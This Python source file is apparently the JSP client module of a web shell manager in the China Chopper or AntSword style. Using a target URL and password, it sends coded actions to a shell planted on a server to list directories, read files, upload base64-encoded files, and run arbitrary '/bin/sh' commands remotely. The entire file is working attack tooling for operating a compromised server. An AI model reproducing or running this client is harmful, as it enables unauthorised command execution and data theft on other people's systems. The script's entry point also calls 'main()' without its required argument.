from .sword import Sender
import os
import base64


JSP_MAKE=1
JSP_INDEX="A"
JSP_READDICT="B"
JSP_READFILE="C"
JSP_SAVEFILE="D"
JSP_DELETE="E"
JSP_RENAME="I"
JSP_RETIME="K"
JSP_NEWDICT="J"
JSP_UPLOAD="G"
JSP_DOWNLOAD="F"
JSP_SHELL="M"


class Jsp(Sender):

    def send(self, **kargs):
        kargs.update({self.key : JSP_MAKE, "code":self.encoding})
        return super().send(**kargs)

    def init(self):
        self.index()
        self.show() 

    def index(self):
        res =  self.send(action=JSP_INDEX)
        self.pwd = res
        dirs = self.ls(self.pwd)
        self.select_now = dirs[0]
        return res

    def ls(self, path, no_cd=False):
        files = [i.split("\t") for i in self.send(action=JSP_READDICT, z1=path).split('\n')]
        if not no_cd:
            self.now_dirs = {i[0]:i for i in files}
            return list(self.now_dirs.keys())
        else:
            return [i[0] for i in files]


    def readfile(self, file):
        return self.send(action=JSP_READFILE, z1=file)

    def upload(self, file):
        fname = os.path.basename(file)
        content = ""
        with open(file, 'rb') as fp:
            content = base64.b64encode(fp.read()).decode()

        dname = os.path.join(self.pwd, fname)
        return self.send(action=JSP_UPLOAD, z1=dname, z2=content)

    def cmd(self, cmd):
        cmds = "cd {pwd} ;{cmd};echo [S];pwd;echo [E]".format(pwd=self.pwd, cmd=cmd)
        res = self.send(action=JSP_SHELL, z1="-c/bin/sh", z2=cmds)
        result,other = res.split("[S]")
        pwd, error = other.split("[E]")
        self.pwd = pwd.strip()
        return result, error

    def if_is_dir(self, select_now):
        # print(self.now_dirs, select_now)
        # if self.now_dirs[select_now][2] == '4096' and 'R' in self.now_dirs[select_now][3]:
        if select_now[-1] == '/' or select_now[-1] == '\\':
            return True
        return False





def main(args):
    j = Jsp(args.target, args.passwd)
    j.run()

if __name__ == '__main__':
    main()
